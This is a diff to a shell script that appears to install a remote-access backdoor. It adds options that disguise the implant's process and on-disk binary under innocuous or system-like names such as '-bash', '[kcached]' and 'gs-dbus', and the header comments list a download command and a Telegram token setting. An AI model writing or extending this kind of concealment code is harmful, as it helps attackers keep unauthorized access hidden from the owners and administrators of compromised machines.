@@ -40,7 +40,10 @@
 # GS_DSTDIR="/tmp/foobar/blah"
 #		- Specify custom installation directory
 # GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process
+#       - Specify custom hidden name for process, default is [kcached]
+# GS_BIN_HIDDEN_NAME="gs-dbus"
+#       - Specify custom name for binary on filesystem (default is gs-dbus)
+#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 # GS_TG_TOKEN=
@@ -673,9 +676,12 @@ init_vars()
 	}
 
 	# Defaults
-	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
+	# Binary file is called gs-dbus or set to same name as Process name if
+	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
+	[[ -n $GS_BIN_HIDDEN_NAME ]] && BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
+	[[ -z $BIN_HIDDEN_NAME ]] && BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
 	
-	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
+	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
 	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
 	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
